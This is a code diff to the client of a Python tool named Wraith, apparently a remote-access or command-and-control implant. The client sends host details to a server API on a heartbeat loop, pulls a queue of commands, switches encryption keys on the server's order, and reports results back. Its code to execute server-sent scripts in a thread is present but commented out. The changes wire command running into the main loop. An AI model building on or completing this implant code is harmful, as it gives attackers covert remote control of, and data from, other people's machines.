@@ -58,7 +58,6 @@ class Wraith(object):
         self.api_url = api_url # Create a local copy of the API url
         self.CRYPT_KEY = CRYPT_KEY # Create a local copy of the encryption key
         self.crypt = crypt_obj # Create a local copy of the encryption object
-        self.scripts = {} # Create a dict of all the scripts the wraith can execute. These are fetched from the server.
         self.command_queue = [] # Create a queue of all the commands to run
 
     # Make requests to the api and return responses
@@ -134,9 +133,6 @@ class Wraith(object):
                 "available_disk": shutil.disk_usage("/")[2],
                 "used_disk": shutil.disk_usage("/")[1],
                 "local_ip": self.get_ip(),
-                "macaddr": get_mac(),
-                "os_type": platform.platform(),
-                "os_name": socket.gethostname(),
             },
             "wraith_id": self.id,
         }
@@ -149,21 +145,45 @@ class Wraith(object):
             # Append commands to queue
             for command in response["command_queue"]:
                 self.command_queue.append(command)
+            # If we're told to switch encryption keys, switch
+            if "switch_key" in response.keys():
+                self.CRYPT_KEY = response["switch_key"]
             return True
         else: return False
 
-    # Add a script to the list of scripts
-    def script(self, mode, scriptname, code=""):
-        if mode == "add":
-            # Add the code to the scripts dict
-            self.scripts[scriptname] = code
+    def putresult(self, status="SUCCESS", result="/No Data/"):
+        # Create the data we need to send
+        data = {}
+        data["message_type"] = "putresults"
+        data["data"] = {
+            "cmdstatus": status,
+            "result": result,
+            "wraith_id": self.id,
+        }
+        # Send the request
+        response = self.api(data)
+        # Check the data received back
+        if isinstance(response, type({})) and response["status"] == "SUCCESS":
+            # If the server did not identify itself correctly, fail
+            if response["server_id"] != TRUSTED_SERVER: return False
+            # If we're told to switch encryption keys, switch
+            if "switch_key" in response.keys():
+                self.CRYPT_KEY = response["switch_key"]
             return True
-        elif mode == "remove":
-            # Remove the code from scripts dict
-            try:
-                del self.scripts[scriptname]
-                return True
-            except: return False
+        else: return False
+
+    # Run all of the commands in the command_queue
+    def run_commands(self):
+        for script in self.command_queue:
+            self.putresult("SUCCESS", script)
+            # Define a script_main function to prevent errors in case of incorrectly formatted modules
+            #script_main = lambda a, b, c: 0
+            # This should define the script_main function
+            #exec(script)
+            # Run the script_main function in a thread
+            #script_thread = threading.Thread(target=script_main)
+            #script_thread.start()
+        self.command_queue = []
 
 # Create an instance of wraith
 wraith = Wraith(connect_url, CRYPT_KEY, aes)
@@ -191,8 +211,7 @@ while True:
         continue
 
     if len(wraith.command_queue) > 0:
-        pass#wraith.runCommands()
-        # TODO
-    else:
-        # Delay sending hearbeats to prevent DDoSing our own server
-        time.sleep(3)
+        wraith.run_commands()
+
+    # Delay sending hearbeats to prevent DDoSing our own server
+    time.sleep(3)
